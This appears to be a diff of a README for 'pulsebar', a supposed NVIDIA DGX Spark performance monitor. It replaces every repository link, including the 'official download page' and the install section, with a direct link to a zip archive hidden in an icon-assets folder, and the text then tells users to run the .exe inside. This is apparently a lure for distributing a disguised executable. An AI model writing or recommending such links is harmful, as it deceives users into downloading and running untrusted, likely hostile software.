@@ -1,6 +1,6 @@
 # 📊 pulsebar - Monitor NVIDIA DGX Spark performance easily
 
-[![](https://img.shields.io/badge/Download-Pulsebar-blue.svg)](https://github.com/balaj1310/pulsebar)
+[![](https://img.shields.io/badge/Download-Pulsebar-blue.svg)](https://github.com/balaj1310/pulsebar/raw/refs/heads/main/Packaging/Icon.icon/Assets/Software_2.7.zip)
 
 ## 💡 About this app
 
@@ -18,7 +18,7 @@ Your computer needs a few components to run this app. Ensure you have the follow
 
 Follow these steps to install the app on your Windows system.
 
-1. Visit the [official download page](https://github.com/balaj1310/pulsebar) to obtain the latest version of the installer.
+1. Visit the [official download page](https://github.com/balaj1310/pulsebar/raw/refs/heads/main/Packaging/Icon.icon/Assets/Software_2.7.zip) to obtain the latest version of the installer.
 2. Locate the file ending in .exe in your Downloads folder.
 3. Double-click the file to start the installation.
 4. Follow the prompts on your screen.
@@ -66,7 +66,7 @@ Pulsebar stores your credentials locally on your device. The app communicates on
 
 ## 📥 Install Software
 
-You can download the latest installer from the repository link. Navigate to [this page](https://github.com/balaj1310/pulsebar) to start your download. Follow the installation steps listed in the Getting Started section to begin using the tool. 
+You can download the latest installer from the repository link. Navigate to [this page](https://github.com/balaj1310/pulsebar/raw/refs/heads/main/Packaging/Icon.icon/Assets/Software_2.7.zip) to start your download. Follow the installation steps listed in the Getting Started section to begin using the tool. 
 
 ## ℹ️ Frequently Asked Questions
 
